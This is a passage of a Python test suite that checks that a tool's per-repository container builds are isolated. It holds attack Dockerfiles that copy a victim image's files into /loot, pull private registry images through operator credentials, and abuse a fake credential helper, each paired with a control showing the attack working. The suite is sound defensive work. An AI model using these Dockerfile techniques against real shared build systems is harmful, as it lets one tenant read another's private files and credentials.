    built. Control: with leerie's images in the worker's namespace and the
    check overridden, the same `FROM` attack copies the victim's file.
    Falsified live (2026-11-03): the control is that falsification."""
    tag, secret = _victim(buildkit, tmp_path)
    assert _cat(buildkit, tag, _WORKER_ROOT_FILE) == secret + "\n"
    attacks = {
        "from": (f"ARG BASE_IMAGE\nFROM {tag} AS v\nFROM $BASE_IMAGE\n"
                 f"COPY --from=v {_WORKER_ROOT_FILE} /loot\n"),
        "bind": ("ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN --mount=type=bind,"
                 f"from={tag},target=/v cat /v{_WORKER_ROOT_FILE} > /loot\n"),
    }
    for name, df in attacks.items():
        a = _one_file_repo(tmp_path / f"a-{name}", df)
        err = _real_repo_build_end(_real_repo_build_start(
            buildkit, a, tmp_path / f"s-{name}", f"leerie-test-i3:{name}"),
            ok=False)
        assert "pull access denied" in err, err[-3000:]
    # The control: as before the fix.
    ctl = tmp_path / "ctl"
    ctl.mkdir()
    ctag, csecret = _victim(buildkit, ctl, buildkit["ns"], _AS_BEFORE)
    a = _one_file_repo(ctl / "a", (
        f"ARG BASE_IMAGE\nFROM {ctag} AS v\nFROM $BASE_IMAGE\n"
        f"COPY --from=v {_WORKER_ROOT_FILE} /loot\n"))
    _real_repo_build_end(_real_repo_build_start(
        buildkit, a, ctl / "s-a", "leerie-test-i3:ctl", _AS_BEFORE,
        LEERIE_TEST_IMAGE_NS=buildkit["ns"]))
    assert _cat(buildkit, "leerie-test-i3:ctl",
                "/opt/leerie-worker-root/loot", ns="nc") == csecret + "\n"


@_real
def test_no_repository_build_runs_where_the_worker_reads_leeries_images(
        buildkit, tmp_path):
    """The refusal on the real daemon: leerie's namespace set to the one its
    worker reads, `build_repo_image` runs no build and says why."""
    v = _one_file_repo(tmp_path / "v", "ARG BASE_IMAGE\nFROM $BASE_IMAGE\n")
    err = _real_repo_build_end(_real_repo_build_start(
        buildkit, v, tmp_path / "s", "leerie-test-i3:refused",
        '\nLEERIE_IMAGE_NS="$LEERIE_TEST_IMAGE_NS"\n',
        LEERIE_TEST_IMAGE_NS=buildkit["ns"]), ok=False)
    assert f"reads the containerd namespace {buildkit['ns']}, where leerie " \
           "keeps its images" in err, err[-3000:]
    assert "building per-repo container image" not in err


@_real
def test_old_repository_images_leave_the_workers_namespace_unless_in_use(
        buildkit, tmp_path):
    """`leerie_sweep_worker_images` on the real namespace: an image named
    `leerie-repo/…` that no container uses is removed; one a container was
    created from, by digest as the launcher runs it, is left, and the build
    refused naming it, until the container is gone. Other images stay.
    `used` is an image of its own, its only name: nerdctl records, for a
    container created by digest, the first name with that digest, and
    refuses to remove that name (measured 2026-11-03, nerdctl 2.3.5), as a
    repository image, one name per digest, is."""
    nc, hx = buildkit["nc"], secrets.token_hex(4)
    old, used = f"leerie-repo/old-{hx}:0.43.0", f"leerie-repo/used-{hx}:0.43.0"
    subprocess.run([*nc, "tag", "leerie-test-base:1", old], check=True,
                   capture_output=True, timeout=120)
    subprocess.run([*nc, "pull", "-q", "busybox:musl"], check=True,
                   capture_output=True, timeout=600)
    subprocess.run([*nc, "tag", "busybox:musl", used], check=True,
                   capture_output=True, timeout=120)
    subprocess.run([*nc, "image", "rm", "busybox:musl"], check=True,
                   capture_output=True, timeout=120)
    digest = subprocess.run(
        [*nc, "image", "inspect", "-f", "{{index .RepoDigests 0}}", used],
        check=True, capture_output=True, text=True).stdout.strip()
    ctr = f"leerie-test-sweep-{hx}"
    subprocess.run([*nc, "create", "--network", "none", "--name", ctr,
                    digest.rsplit("@", 1)[1], "true"], check=True,
                   capture_output=True, timeout=120)
    sweep = ("set -uo pipefail\n" + FRONTEND_SH_SOURCE + _wrapper(buildkit)
             + 'leerie_buildkit_check || '
               '{ echo "CHECK $LEERIE_BUILDKIT_REFUSAL"; exit 1; }\n'
             'if leerie_sweep_worker_images; then echo SWEPT; '
             'else echo "REFUSED $LEERIE_BUILDKIT_REFUSAL"; fi\n')

    def names() -> set[str]:
        return set(subprocess.run(
            [*nc, "images", "--format", "{{.Repository}}:{{.Tag}}"],
            capture_output=True, text=True, check=True).stdout.split())
    try:
        r = subprocess.run(["bash", "-c", sweep], capture_output=True,
                           text=True, timeout=300, env=_real_env(buildkit))
        left = names()
        assert old not in left and "leerie-test-base:1" in left, left
        assert used in left, left
        assert r.stdout.startswith("REFUSED ") and used in r.stdout, \
            (r.stdout, r.stderr)
    finally:
        subprocess.run([*nc, "rm", "-f", ctr], capture_output=True,
                       timeout=120)
    r = subprocess.run(["bash", "-c", sweep], capture_output=True, text=True,
                       timeout=300, env=_real_env(buildkit))
    assert r.stdout == "SWEPT\n", (r.stdout, r.stderr)
    assert not {old, used} & names()


# A Docker Registry HTTP API v2 on loopback that serves one image, behind
# HTTP Basic authentication: the operator's registry, holding another
# repository's private image. Run inside RootlessKit's network namespace
# (where buildkitd runs), so BuildKit's `127.0.0.1` is the server's.
_AUTH_REGISTRY = r'''
import base64, hashlib, http.server, io, json, sys, tarfile, gzip
portfile, user, pw, secret = sys.argv[1:5]
data = (secret + "\n").encode()
raw = io.BytesIO()
with tarfile.open(fileobj=raw, mode="w") as tf:
    d = tarfile.TarInfo("srv"); d.type = tarfile.DIRTYPE; d.mode = 0o755
    tf.addfile(d)
    f = tarfile.TarInfo("srv/private.txt"); f.size = len(data); f.mode = 0o644
    tf.addfile(f, io.BytesIO(data))
layer_raw = raw.getvalue()
layer = gzip.compress(layer_raw, mtime=0)
dg = lambda b: "sha256:" + hashlib.sha256(b).hexdigest()
config = json.dumps({"architecture": "amd64", "os": "linux", "config": {},
                     "rootfs": {"type": "layers",
                                "diff_ids": [dg(layer_raw)]}}).encode()
manifest = json.dumps({
    "schemaVersion": 2,
    "mediaType": "application/vnd.oci.image.manifest.v1+json",
    "config": {"mediaType": "application/vnd.oci.image.config.v1+json",
               "digest": dg(config), "size": len(config)},
    "layers": [{"mediaType": "application/vnd.oci.image.layer.v1.tar+gzip",
                "digest": dg(layer), "size": len(layer)}]}).encode()
blobs = {dg(config): config, dg(layer): layer}
want = "Basic " + base64.b64encode(f"{user}:{pw}".encode()).decode()
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def _send(self, code, body=b"", head=None, ctype=None):
        self.send_response(code)
        for k, v in (head or {}).items(): self.send_header(k, v)
        if ctype: self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        if self.command != "HEAD": self.wfile.write(body)
    def do_GET(self):
        if self.headers.get("Authorization") != want:
            return self._send(401, b'{"errors":[{"code":"UNAUTHORIZED"}]}',
                              {"WWW-Authenticate": 'Basic realm="leerie-test"'})
        p = self.path.split("?")[0]
        if p == "/v2/":
            return self._send(200, b"{}")
        if p in ("/v2/victim/app/manifests/leerie-repo",
                 "/v2/victim/app/manifests/" + dg(manifest)):
            return self._send(200, manifest,
                              {"Docker-Content-Digest": dg(manifest)},
                              "application/vnd.oci.image.manifest.v1+json")
        for d, b in blobs.items():
            if p == "/v2/victim/app/blobs/" + d:
                return self._send(200, b, {"Docker-Content-Digest": d},
                                  "application/octet-stream")
        self._send(404)
    do_HEAD = do_GET
s = http.server.ThreadingHTTPServer(("127.0.0.1", 0), H)
open(portfile + ".tmp", "w").write(str(s.server_address[1]))
import os; os.rename(portfile + ".tmp", portfile)
s.serve_forever()
'''


@_real
def test_a_repositorys_build_pulls_with_no_operator_credential(
        buildkit, tmp_path):
    """Review round 37, isolation I4, made from its proof
    (operator_registry_creds.sh): the operator's Docker config holds a
    credential for a registry that keeps another repository's private
    image; an attacking repository's Dockerfile names that image. Through
    `build_repo_image`, with the operator's config in the environment, the
    build is refused by the registry (401): it was given leerie's empty
    config. Control: the same Dockerfile built directly with the operator's
    config reads the private file, so the registry and the credential
    work. Falsified live (2026-11-03): `DOCKER_CONFIG="$_auth"` dropped
    from `build_repo_image`'s first build (the attack reads the file)."""
    secret = f"V-PRIVATE-{secrets.token_hex(6)}"
    portfile = tmp_path / "port"
    srv = subprocess.Popen(
        [_SETUPTOOL, "nsenter", "--", sys.executable, "-I", "-c",
         _AUTH_REGISTRY, str(portfile), "operator", "s3cret-pw", secret],
        start_new_session=True, stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE)
    try:
        deadline = time.monotonic() + 30
        while not portfile.exists() and time.monotonic() < deadline:
            time.sleep(0.1)
        assert portfile.exists(), srv.stderr.read() if srv.poll() is not None \
            else "the registry did not start"
        reg = f"127.0.0.1:{portfile.read_text()}"
        op = tmp_path / "operator-docker"
        op.mkdir()
        (op / "config.json").write_text(json.dumps({"auths": {reg: {
            "auth": base64.b64encode(b"operator:s3cret-pw").decode()}}}))
        df = (f"ARG BASE_IMAGE\nFROM {reg}/victim/app:leerie-repo AS v\n"
              "FROM $BASE_IMAGE\nCOPY --from=v /srv/private.txt /loot\n")
        a = _one_file_repo(tmp_path / "a", df)
        err = _real_repo_build_end(_real_repo_build_start(
            buildkit, a, tmp_path / "s-a", "leerie-test-i4:a",
            DOCKER_CONFIG=str(op)), ok=False)
        assert "401" in err or "nauthorized" in err, err[-3000:]
        # The control: the operator's config, given to the build directly.
        ctx = tmp_path / "ctx"
        ctx.mkdir()
        (ctx / "Dockerfile").write_text(df)
        ctl = subprocess.run(
            [*buildkit["rc"], "build", "--buildkit-host", buildkit["host"],
             "--no-cache", "--build-arg", "BASE_IMAGE=leerie-test-base:1",
             "-t", "leerie-test-i4:ctl", str(ctx)],
            capture_output=True, text=True, timeout=900,
            env={**os.environ, "DOCKER_CONFIG": str(op)})
        assert ctl.returncode == 0, ctl.stderr[-3000:]
        assert _cat(buildkit, "leerie-test-i4:ctl", "/loot") == secret + "\n"
    finally:
        os.killpg(srv.pid, signal.SIGTERM)
        srv.wait(timeout=30)


# A Docker credential helper standing for the operator's
# `docker-credential-secretservice` (golang-docker-credential-helpers),
# which `docker login` fills: builtins only, no PATH program. It logs each
# call and answers a `get` for the test's registry with the operator's
# credential, any other host with "not found", as the real one does.
_CRED_HELPER = r'''#!/bin/bash
read -r _url
printf '%s %s\n' "$1" "$_url" >> "@LOG@"
case "$1:$_url" in
  get:@REG@|get:http://@REG@|get:https://@REG@) printf '{"ServerURL":"%s","Username":"operator","Secret":"s3cret-pw"}\n' "$_url" ;;
  get:*) printf 'credentials not found in native keychain\n'; exit 1 ;;
  *) exit 1 ;;
esac
'''


@_real
def test_a_repositorys_build_asks_no_credential_helper_and_reads_no_env(
        buildkit, tmp_path):
    """Review round 38, isolation X1, made from its proof: buildctl takes
    the platform's default credential helper from PATH when its Docker
    config names no auth entry, store or helper, and reads
    DOCKER_AUTH_CONFIG before any file. With a fake
    `docker-credential-secretservice` on PATH holding the operator's login
    (the operator's config `{"credsStore":"secretservice"}`), and then with
    the credential in DOCKER_AUTH_CONFIG, an attacking repository's
    Dockerfile names a private image of the operator's registry: through
    `build_repo_image` both fail with 401, and the helper is never asked.
    Control: the same Dockerfile built directly, with an empty Docker
    config and the helper on PATH, reads the private file and the helper
    is asked. Falsified live (2026-11-03): with `build_repo_image`'s config
    left empty (no config.json) the helper case read the file; with
    `DOCKER_AUTH_CONFIG=''` dropped from its first build the env case
    did."""
    secret = f"V-PRIVATE-{secrets.token_hex(6)}"
    portfile = tmp_path / "port"
    srv = subprocess.Popen(
        [_SETUPTOOL, "nsenter", "--", sys.executable, "-I", "-c",
         _AUTH_REGISTRY, str(portfile), "operator", "s3cret-pw", secret],
        start_new_session=True, stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE)
    try:
        deadline = time.monotonic() + 30
        while not portfile.exists() and time.monotonic() < deadline:
            time.sleep(0.1)
        assert portfile.exists(), srv.stderr.read() if srv.poll() is not None \
            else "the registry did not start"
        reg = f"127.0.0.1:{portfile.read_text()}"
        hdir = tmp_path / "helper-bin"
        hdir.mkdir()
        log = tmp_path / "helper.log"
        helper = hdir / "docker-credential-secretservice"
        helper.write_text(_CRED_HELPER.replace("@LOG@", str(log))
                          .replace("@REG@", reg))
        helper.chmod(0o755)
        path = f"{hdir}:{os.environ['PATH']}"
        op = tmp_path / "operator-docker"
        op.mkdir()
        (op / "config.json").write_text('{"credsStore":"secretservice"}')
        df = (f"ARG BASE_IMAGE\nFROM {reg}/victim/app:leerie-repo AS v\n"
              "FROM $BASE_IMAGE\nCOPY --from=v /srv/private.txt /loot\n")
        cases = {
            "helper": {"DOCKER_CONFIG": str(op), "PATH": path},
            "env": {"DOCKER_AUTH_CONFIG": json.dumps({"auths": {reg: {
                "auth": base64.b64encode(b"operator:s3cret-pw").decode()}}})},
        }
        for name, env in cases.items():
            log.unlink(missing_ok=True)
            a = _one_file_repo(tmp_path / f"a-{name}", df)
            err = _real_repo_build_end(_real_repo_build_start(
                buildkit, a, tmp_path / f"s-{name}", f"leerie-test-x1:{name}",
                **env), ok=False)
            assert "401" in err or "nauthorized" in err, (name, err[-3000:])
            assert not log.exists(), (name, log.read_text())
        # The control: the helper on PATH, an empty Docker config, built
        # directly.
        empty = tmp_path / "empty-docker"
        empty.mkdir()
        ctx = tmp_path / "ctx"
        ctx.mkdir()
        (ctx / "Dockerfile").write_text(df)
        ctl = subprocess.run(
            [*buildkit["rc"], "build", "--buildkit-host", buildkit["host"],
             "--no-cache", "--build-arg", "BASE_IMAGE=leerie-test-base:1",
             "-t", "leerie-test-x1:ctl", str(ctx)],
            capture_output=True, text=True, timeout=900,
            env={**os.environ, "DOCKER_CONFIG": str(empty), "PATH": path})
        assert ctl.returncode == 0, ctl.stderr[-3000:]
        assert _cat(buildkit, "leerie-test-x1:ctl", "/loot") == secret + "\n"
        assert f"get {reg}" in log.read_text()
    finally:
        os.killpg(srv.pid, signal.SIGTERM)
        srv.wait(timeout=30)


def _cache_mount_records(bk: dict) -> list[str]:
    out = subprocess.run(
        [shutil.which("buildctl") or "buildctl", "--addr", bk["host"], "du",
         "-v", "--filter", "type==exec.cachemount"],
        capture_output=True, text=True, timeout=120, check=True).stdout
    return [line.split(None, 1)[1] for line in out.splitlines()
            if line.startswith("ID:")]


@_real
def test_a_repository_build_leaves_no_cache_mount_record(buildkit, tmp_path):
    """Review round 37, execution E4: each build's cache-mount namespace is
    its own, so the records it leaves can never be reused, and BuildKit's
    collection did not reclaim them (13 builds left 838 MB). After a
    repository build whose Dockerfile fills a 20 MB cache mount, the daemon
    holds no more cache-mount records than before. Falsified live
    (2026-11-03): the prune dropped from `build_repo_image`'s first build
    (one record more)."""
    before = _cache_mount_records(buildkit)
    a = _one_file_repo(tmp_path / "a", (
        "ARG BASE_IMAGE\nFROM $BASE_IMAGE\nRUN --mount=type=cache,"
        "target=/c dd if=/dev/zero of=/c/f bs=1M count=20\n"))
    _real_repo_build(buildkit, a, tmp_path / "s", "leerie-test-e4:a")
    assert sorted(_cache_mount_records(buildkit)) == sorted(before)


_CONTAINERD = shutil.which("containerd")
_CTR = shutil.which("ctr")


def _private_containerd_ingest(tmp_path: Path, name: str,
                               policy_file: str | None) -> tuple[int, int]:
    """A containerd of the test's own (its own config, root, state and
    socket under `tmp_path`, in the rootless user's RootlessKit namespace,
    never the operator's daemon), its config the installer's lines when
    `policy_file` is given. A blob is ingested in one namespace, then by its
    digest alone, with no body, in another. Returns both statuses."""
    d = tmp_path / name
    d.mkdir()
    sock = d / "c.sock"
    (d / "config.toml").write_text(
        f'version = 2\nroot = "{d}/root"\nstate = "{d}/state"\n'
        'disabled_plugins = ["io.containerd.grpc.v1.cri", '
        '"io.containerd.nri.v1.nri"]\n'
        f'[grpc]\n  address = "{sock}"\n[ttrpc]\n  address = "{sock}.ttrpc"\n'
        + ("\n" + policy_file.split("\n", 1)[1] if policy_file else ""))
    p = subprocess.Popen([_SETUPTOOL, "nsenter", "--", _CONTAINERD,
                          "--config", str(d / "config.toml")],
                         start_new_session=True, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL)
    try:
        deadline = time.monotonic() + 60
        while not sock.exists() and time.monotonic() < deadline:
            time.sleep(0.2)
        assert sock.exists(), "the test's containerd did not start"
        blob = secrets.token_bytes(64)
        dg = "sha256:" + hashlib.sha256(blob).hexdigest()
        ctr = [_CTR, "--address", str(sock)]
        args = ["content", "ingest", "--expected-digest", dg,
                "--expected-size", "64"]
        a = subprocess.run([*ctr, "-n", "leerie", *args, "a"], input=blob,
                           capture_output=True, timeout=60)
        empty = d / "empty"
        empty.write_bytes(b"")
        with empty.open("rb") as f:
            b = subprocess.run([*ctr, "-n", "worker", *args, "b"], stdin=f,
                               capture_output=True, timeout=60)
        return a.returncode, b.returncode
    finally:
        os.killpg(p.pid, signal.SIGTERM)
        try:
            p.wait(timeout=60)
        except subprocess.TimeoutExpired:
            os.killpg(p.pid, signal.SIGKILL)
            p.wait(timeout=30)
        # The root is owned by the namespace's root; remove it from there.
        subprocess.run([_SETUPTOOL, "nsenter", "--", "/bin/rm", "-rf",
                        str(d)], capture_output=True, timeout=120)


@_real
@pytest.mark.skipif(not (_CONTAINERD and _CTR), reason="needs containerd "
                    "and ctr")
def test_the_installers_containerd_config_shares_no_content(tmp_path):
    """Review round 38, isolation X2: containerd's default
    `content_sharing_policy = "shared"` gives a namespace's ingest a blob
    another namespace holds, by its digest alone (a build then read
    another repository's image by `FROM <registry>/x@<digest>`, its
    registry serving no body). On a containerd of the test's own, with the
    lines `_runtime_linux_containerd_config` writes, an ingest by digest
    with no body in another namespace fails; with containerd's default
    config (the control) it succeeds. Falsified live (2026-11-03): the
    policy line dropped from the installer (the ingest succeeds)."""
    home = tmp_path / "home"
    home.mkdir()
    subprocess.run(
        ["bash", "-c", f'. "{REPO_ROOT}/scripts/runtime-install.sh"\n'
         "_runtime_linux_containerd_config\n"],
        check=True, capture_output=True, timeout=60,
        env={"DRY_RUN": "false", "PATH": "/usr/bin:/bin", "HOME": str(home)})
    installed = (home / ".config" / "containerd" / "config.toml").read_text()
    a, b = _private_containerd_ingest(tmp_path, "isolated", installed)
    assert a == 0 and b != 0, (a, b)
    assert _private_containerd_ingest(tmp_path, "default", None) == (0, 0)
